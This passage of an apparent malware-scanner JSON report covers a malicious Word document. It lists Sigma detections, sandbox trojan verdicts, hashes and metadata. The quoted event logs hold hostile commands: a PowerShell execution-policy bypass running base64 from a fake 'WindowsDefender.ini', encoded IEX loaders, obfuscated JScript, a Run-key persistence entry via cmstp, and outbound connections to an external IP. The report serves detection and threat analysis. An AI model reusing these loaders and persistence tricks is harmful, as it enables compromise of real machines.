                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-A9BE-63D5-1106-000000004800}; ProcessId=5744; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7020-63A4-5300-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3812; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\WindowsDefender.ini)))); EventID=1; LogonGuid=C784477D-7021-63A4-0434-030000000000; LogonId=209924; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1674947006; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "1ca8739651295d88708cb5ddfb7a115ae0d202152a80ee4c7871e62f3509c938",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "WmiPrvSE Spawned PowerShell",
                                                                       "rule_description":  "Detects Powershell as a child of the WmiPrvSE process. Which could be a signe of remote access via WMI",
                                                                       "rule_author":  "Markus Neis @Karneades"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=1; CommandLine=[\u0027PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHBhY2thZ2U+CiAgPGNvbXBvbmVudAogICAgaWQ9IngiPgogICAgPHJlZ2lzdHJhdGlvbgogICAgICBkZXNjcmlwdGlvbj0ieCIKICAgICAgcHJvZ2lkPSJ4IgogICAgICB2ZXJzaW9uPSIxLjAwIgogICAgICByZW1vdGFibGU9IlRydWUiPgogICAgICA8c2NyaXB0IGxhbmd1YWdlPSJKU2NyaXB0Ij48IVtDREFUQVsKdmFyIGE9WydLMmQzd3IwPSddOyhmdW5jdGlvbihjLGQpe3ZhciBlPWZ1bmN0aW9uKGYpe3doaWxlKC0tZil7Y1sncHVzaCddKGNbJ3NoaWZ0J10oKSk7fX07ZSgrK2QpO30oYSwweDFmMykpO3ZhciBiPWZ1bmN0aW9uKGMsZCl7Yz1jLTB4MDt2YXIgZT1hW2NdO2lmKGJbJ0; Image=[\u0027PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHBhY2thZ2U+CiAgPGNvbXBvbmVudAogICAgaWQ9IngiPgogICAgPHJlZ2lzdHJhdGlvbgogICAgICBkZXNjcmlwdGlvbj0ieCIKICAgICAgcHJvZ2lkPSJ4IgogICAgICB2ZXJzaW9uPSIxLjAwIgogICAgICByZW1vdGFibGU9IlRydWUiPgogICAgICA8c2NyaXB0IGxhbmd1YWdlPSJKU2NyaXB0Ij48IVtDREFUQVsKdmFyIGE9WydLMmQzd3IwPSddOyhmdW5jdGlvbihjLGQpe3ZhciBlPWZ1bmN0aW9uKGYpe3doaWxlKC0tZil7Y1sncHVzaCddKGNbJ3NoaWZ0J10oKSk7fX07ZSgrK2QpO30oYSwweDFmMykpO3ZhciBiPWZ1bmN0aW9uKGMsZCl7Yz1jLTB4MDt2YXIgZT1hW2NdO2lmKGJbJ0}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "6011c0e706a0ea8a69892186b9808f52466832e2c60ea353b876a15100a2c891",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "PowerShell Base64 Encoded IEX Cmdlet",
                                                                       "rule_description":  "Detects usage of a base64 encoded \"IEX\" cmdlet in a process command line",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=1; CommandLine=[\u0027PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHBhY2thZ2U+CiAgPGNvbXBvbmVudAogICAgaWQ9IngiPgogICAgPHJlZ2lzdHJhdGlvbgogICAgICBkZXNjcmlwdGlvbj0ieCIKICAgICAgcHJvZ2lkPSJ4IgogICAgICB2ZXJzaW9uPSIxLjAwIgogICAgICByZW1vdGFibGU9IlRydWUiPgogICAgICA8c2NyaXB0IGxhbmd1YWdlPSJKU2NyaXB0Ij48IVtDREFUQVsKdmFyIGE9WydLMmQzd3IwPSddOyhmdW5jdGlvbihjLGQpe3ZhciBlPWZ1bmN0aW9uKGYpe3doaWxlKC0tZil7Y1sncHVzaCddKGNbJ3NoaWZ0J10oKSk7fX07ZSgrK2QpO30oYSwweDFmMykpO3ZhciBiPWZ1bmN0aW9uKGMsZCl7Yz1jLTB4MDt2YXIgZT1hW2NdO2lmKGJbJ0; Image=[\u0027PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHBhY2thZ2U+CiAgPGNvbXBvbmVudAogICAgaWQ9IngiPgogICAgPHJlZ2lzdHJhdGlvbgogICAgICBkZXNjcmlwdGlvbj0ieCIKICAgICAgcHJvZ2lkPSJ4IgogICAgICB2ZXJzaW9uPSIxLjAwIgogICAgICByZW1vdGFibGU9IlRydWUiPgogICAgICA8c2NyaXB0IGxhbmd1YWdlPSJKU2NyaXB0Ij48IVtDREFUQVsKdmFyIGE9WydLMmQzd3IwPSddOyhmdW5jdGlvbihjLGQpe3ZhciBlPWZ1bmN0aW9uKGYpe3doaWxlKC0tZil7Y1sncHVzaCddKGNbJ3NoaWZ0J10oKSk7fX07ZSgrK2QpO30oYSwweDFmMykpO3ZhciBiPWZ1bmN0aW9uKGMsZCl7Yz1jLTB4MDt2YXIgZT1hW2NdO2lmKGJbJ0}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=1; CommandLine=[\u0027SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAbABMADEAcgBrAHkAUABKAGMAaAAzADQAZgBjADMAMgBQAC8AUQAzADMAagBaAE4AQQBZAFYASAB2AGYAbwBiAHEAUQ; Image=[\u0027SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAbABMADEAcgBrAHkAUABKAGMAaAAzADQAZgBjADMAMgBQAC8AUQAzADMAagBaAE4AQQBZAFYASAB2AGYAbwBiAHEAUQ}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "b079b9bebaa7ac01f379d6d83aa123ec20bc9068b9a097e09aec5f87b42d91d1",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "PowerShell Base64 Encoded FromBase64String Cmdlet",
                                                                       "rule_description":  "Detects usage of a base64 encoded \"FromBase64String\" cmdlet in a process command line",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=1; CommandLine=[\u0027\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\\n\u003cpackage\u003e\\n  \u003ccomponent\\n    id=\"x\"\u003e\\n    \u003cregistration\\n      description=\"x\"\\n      progid=\"x\"\\n      version=\"1.00\"\\n      remotable=\"True\"\u003e\\n      \u003cscript language=\"JScript\"\u003e\u003c![CDATA[\\nvar a=[\\\u0027K2d3wr0=\\\u0027];(function(c,d){var e=function(f){while(--f){c[\\\u0027push\\\u0027](c[\\\u0027shift\\\u0027]());}};e(++d);}(a,0x1f3));var b=function(c,d){c=c-0x0;var e=a[c];if(b[\\\u0027FloEtK\\\u0027]===undefined){(function(){var f;try{var g=Function(\\\u0027return (function() \\\u0027+\\\u0027{}.constructor(\"return; Image=[\u0027\u003c?xml}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "e75e9983c2277304aa1294c0b077a3139a8405cd1661ccf513a6c05a002acacf",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Base64 Encoded PowerShell Command Detected",
                                                                       "rule_description":  "Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=1; Image=[\u0027\u003c?xml; CommandLine=[\u0027\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\\n\u003cpackage\u003e\\n  \u003ccomponent\\n    id=\"x\"\u003e\\n    \u003cregistration\\n      description=\"x\"\\n      progid=\"x\"\\n      version=\"1.00\"\\n      remotable=\"True\"\u003e\\n      \u003cscript language=\"JScript\"\u003e\u003c![CDATA[\\nvar a=[\\\u0027K2d3wr0=\\\u0027];(function(c,d){var e=function(f){while(--f){c[\\\u0027push\\\u0027](c[\\\u0027shift\\\u0027]());}};e(++d);}(a,0x1f3));var b=function(c,d){c=c-0x0;var e=a[c];if(b[\\\u0027FloEtK\\\u0027]===undefined){(function(){var f;try{var g=Function(\\\u0027return (function() \\\u0027+\\\u0027{}.constructor(\"return}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "06b48fa7870d38bdf92b4d4a9b9c4a4df779bd405fdc5ba0e70911df20027ce1",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Change PowerShell Policies to an Insecure Level",
                                                                       "rule_description":  "Detects use of executionpolicy option to set insecure policies",
                                                                       "rule_author":  "frack113"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-A9B5-63D5-0E06-000000004800}; ProcessId=836; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7020-63A4-5300-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3812; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\WindowsDefender.ini)))); EventID=1; LogonGuid=C784477D-7021-63A4-0434-030000000000; LogonId=209924; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1674946997; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-A9BE-63D5-1106-000000004800}; ProcessId=5744; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7020-63A4-5300-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3812; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\WindowsDefender.ini)))); EventID=1; LogonGuid=C784477D-7021-63A4-0434-030000000000; LogonId=209924; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1674947006; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "1429a6819ff25aad68fb09601fb0b63c4be24919adfd25c4ad925ef8d47d8f22",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "WmiPrvSE Spawned A Process",
                                                                       "rule_description":  "Detects wmiprvse spawning processes",
                                                                       "rule_author":  "Roberto Rodriguez @Cyb3rWard0g"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=1; CommandLine=[\u0027\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\\n\u003cpackage\u003e\\n  \u003ccomponent\\n    id=\"x\"\u003e\\n    \u003cregistration\\n      description=\"x\"\\n      progid=\"x\"\\n      version=\"1.00\"\\n      remotable=\"True\"\u003e\\n      \u003cscript language=\"JScript\"\u003e\u003c![CDATA[\\nvar a=[\\\u0027K2d3wr0=\\\u0027];(function(c,d){var e=function(f){while(--f){c[\\\u0027push\\\u0027](c[\\\u0027shift\\\u0027]());}};e(++d);}(a,0x1f3));var b=function(c,d){c=c-0x0;var e=a[c];if(b[\\\u0027FloEtK\\\u0027]===undefined){(function(){var f;try{var g=Function(\\\u0027return (function() \\\u0027+\\\u0027{}.constructor(\"return; Image=[\u0027\u003c?xml}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "505504b564af2ed8ba77826b758a9eb5bda1701b18ffd11a5266b48d417692fe",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Weak or Abused Passwords In CLI",
                                                                       "rule_description":  "Detects weak passwords or often abused passwords (seen used by threat actors) via the CLI. An example would be a threat actor creating a new user via the net command and providing the password inline",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=7112; EventType=SetValue; Image=C:\\Windows\\system32\\wbem\\wmiprvse.exe; ProcessGuid={C784477D-A9AC-63D5-0C06-000000004800}; UtcTime=1674946988; Details=c:\\windows\\system32\\cmstp.exe /s c:\\programdata\\DefenderService.inf; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefenderUpdater}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "CurrentVersion Autorun Keys Modification",
                                                                       "rule_description":  "Detects modification of autostart extensibility point (ASEP) in registry.",
                                                                       "rule_author":  "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-A9A6-63D5-0A06-000000004800}; ProcessId=80; Product=Microsoft Office 2016; Description=Microsoft Word; Company=Microsoft Corporation; ParentProcessGuid={C784477D-701A-63A4-0F00-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=CE33FC3C687D3C01159A8CAEA7F5482E,SHA256=5D75D0EA8BBB5B652F7B72CF728C00322BD486D54A5C4978CEACDF70B4317EE6,IMPHASH=1B2B96B0763DACAFA277667CA093F96D; OriginalFileName=WinWord.exe; ParentImage=C:\\Windows\\System32\\svchost.exe; FileVersion=16.0.4266.1001; ParentProcessId=848; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" /Automation -Embedding; EventID=1; LogonGuid=C784477D-7021-63A4-DA33-030000000000; LogonId=209882; Image=C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p; UtcTime=1674946982; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "ffbbcedfb9a1fd41ebb288154c10cf5cf869eb25195708be30f8a9df74f411cc",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Svchost Spawning Office Application",
                                                                       "rule_description":  "Detects svchost process spawning an instance of an office application. This happens when the initial word application create an instance of one of the office COM objects such as \u0027Word.Application\u0027, \u0027Excel.Application\u0027...etc. This can be used by malicious actor to create a malicious office document with macros on the fly. (See vba2clr project in reference)",
                                                                       "rule_author":  "Nasreddine Bencherchali"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TargetFilename=C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Templates\\~$Normal.dotm}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "27801b0f98df1ce7686b07b693c59e734c47189ef3db24ea1093f6f00ff2ed67",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Office Macro File Creation",
                                                                       "rule_description":  "Detects the creation of a new office macro files on the systems",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=836; DestinationPortName=https; Protocol=tcp; DestinationIp=64.185.227.155; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-A9B5-63D5-0E06-000000004800}; DestinationHostname=64-185-227-155.static.webnx.com; UtcTime=1671721393; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49745; SourceIsIpv6=false; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.27; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=5744; DestinationPortName=https; Protocol=tcp; Initiated=true; DestinationIp=64.185.227.155; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-A9BE-63D5-1106-000000004800}; DestinationHostname=64-185-227-155.static.webnx.com; UtcTime=1671721400; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49746; SourceIsIpv6=false; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.27; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=836; DestinationPortName=https; SourceIsIpv6=false; DestinationIp=64.185.227.155; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-A9B5-63D5-0E06-000000004800}; DestinationHostname=64-185-227-155.static.webnx.com; UtcTime=1671721405; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49747; Protocol=tcp; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.27; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=836; DestinationPortName=https; Protocol=tcp; DestinationIp=64.185.227.155; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-A9B5-63D5-0E06-000000004800}; DestinationHostname=64-185-227-155.static.webnx.com; UtcTime=1671721418; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49749; SourceIsIpv6=false; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.27; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=836; DestinationPortName=https; SourceIsIpv6=false; DestinationIp=64.185.227.155; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-A9B5-63D5-0E06-000000004800}; DestinationHostname=64-185-227-155.static.webnx.com; UtcTime=1671721420; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49750; Protocol=tcp; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.27; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=5744; DestinationPortName=https; SourceIsIpv6=false; Initiated=true; DestinationIp=64.185.227.155; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-A9BE-63D5-1106-000000004800}; DestinationHostname=64-185-227-155.static.webnx.com; UtcTime=1671721422; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49751; Protocol=tcp; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.27; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=5744; DestinationPortName=https; Protocol=tcp; DestinationIp=64.185.227.155; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-A9BE-63D5-1106-000000004800}; DestinationHostname=64-185-227-155.static.webnx.com; UtcTime=1671721446; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49752; SourceIsIpv6=false; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.27; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=836; DestinationPortName=https; SourceIsIpv6=false; Initiated=true; DestinationIp=64.185.227.155; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-A9B5-63D5-0E06-000000004800}; DestinationHostname=64-185-227-155.static.webnx.com; UtcTime=1671721446; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49753; Protocol=tcp; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.27; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=5744; DestinationPortName=https; Protocol=tcp; DestinationIp=64.185.227.155; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-A9BE-63D5-1106-000000004800}; DestinationHostname=64-185-227-155.static.webnx.com; UtcTime=1671721447; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49754; SourceIsIpv6=false; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.27; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=5744; DestinationPortName=https; Protocol=tcp; DestinationIp=64.185.227.155; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-A9BE-63D5-1106-000000004800}; DestinationHostname=64-185-227-155.static.webnx.com; UtcTime=1671721449; User=DESKTOP-B0T93D6\\george; DestinationPort=443; RuleName=-; SourcePort=49755; SourceIsIpv6=false; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.27; DestinationIsIpv6=false}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "b5e9f310ab6a8611ea1b7b788e712f0f6bf452c3092675694cf6256931874071",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "PowerShell Network Connections",
                                                                       "rule_description":  "Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company\u0027s ip range\u0027)",
                                                                       "rule_author":  "Florian Roth"
                                                                   }
                                                               ],
                                    "tlsh":  "T1D9E4E411FDD8060FF89E4876709DCAD2F6F92E17D2E2B082178B6365281FF2E562D185",
                                    "reputation":  -1,
                                    "size":  719360,
                                    "sandbox_verdicts":  {
                                                             "Zenbox":  {
                                                                            "category":  "malicious",
                                                                            "confidence":  92,
                                                                            "sandbox_name":  "Zenbox",
                                                                            "malware_classification":  [
                                                                                                           "MALWARE",
                                                                                                           "TROJAN",
                                                                                                           "EVADER"
                                                                                                       ]
                                                                        },
                                                             "Yomi Hunter":  {
                                                                                 "category":  "malicious",
                                                                                 "sandbox_name":  "Yomi Hunter",
                                                                                 "malware_classification":  [
                                                                                                                "MALWARE"
                                                                                                            ]
                                                                             }
                                                         },
                                    "ssdeep":  "12288:sToNUZQl+6VWXBi7O9DXKUR43J0HQVqe6ITfEjRUEMlNn03:Z/ln+BioKbOsq+Tb0",
                                    "unique_sources":  10,
                                    "autostart_locations":  [
                                                                {
                                                                    "entry":  "cmd.exe"
                                                                },
                                                                {
                                                                    "entry":  "HKLM\\System\\CurrentControlSet\\Services\\tr8qt5d90",
                                                                    "location":  "HKLM\\System\\CurrentControlSet\\Services"
                                                                }
                                                            ],
                                    "last_submission_date":  1708593610,
                                    "last_analysis_date":  1767468809,
                                    "md5":  "ff46053ad16728062c6e7235bc7e8deb",
                                    "meaningful_name":  "6edc067fc2301d7a972a654b3a07398d9c8cbe7bb38d1165b80ba4a13805e5ac.bin",
                                    "type_tag":  "doc",
                                    "trid":  [
                                                 {
                                                     "file_type":  "Microsoft Word document",
                                                     "probability":  52.6
                                                 },
                                                 {
                                                     "file_type":  "Microsoft Word document (old ver.)",
                                                     "probability":  33.3
                                                 },
                                                 {
                                                     "file_type":  "Generic OLE2 / Multistream Compound",
                                                     "probability":  14.0
                                                 }
                                             ],
                                    "last_seen_itw_date":  1750132800,
                                    "exiftool":  {
                                                     "MIMEType":  "application/msword",
                                                     "LanguageCode":  "English (US)",
                                                     "ModifyDate":  "2018:03:04 19:55:00",
                                                     "SharedDoc":  "No",
                                                     "HyperlinksChanged":  "No",
                                                     "AppVersion":  "16.0",
                                                     "LinksUpToDate":  "No",
                                                     "HeadingPairs":  "Title, 1",
                                                     "FileType":  "DOC",
                                                     "FileTypeExtension":  "doc",
                                                     "CreateDate":  "2018:03:04 19:55:00",
                                                     "ScaleCrop":  "No",
                                                     "CompObjUserType":  "Microsoft Word 97-2003 Document",
                                                     "Security":  "None",
                                                     "Characters":  "78",
                                                     "TotalEditTime":  "0",
                                                     "CodePage":  "Windows Latin 1 (Western European)",
                                                     "CharCountWithSpaces":  "90",
                                                     "Lines":  "1",
                                                     "System":  "Windows",
                                                     "CompObjUserTypeLen":  "32",
                                                     "Identification":  "Word 8.0",
                                                     "RevisionNumber":  "1",
                                                     "Words":  "13",
                                                     "Paragraphs":  "1",
                                                     "LastPrinted":  "0000:00:00 00:00:00",
                                                     "Template":  "Normal.dotm",
                                                     "DocFlags":  "Has picture, 1Table, ExtChar",
                                                     "Pages":  "1",
                                                     "Word97":  "No",
                                                     "Software":  "Microsoft Office Word"
                                                 },
                                    "available_tools":  [
                                                            "sigcheck"
                                                        ]
                                }
             }
}
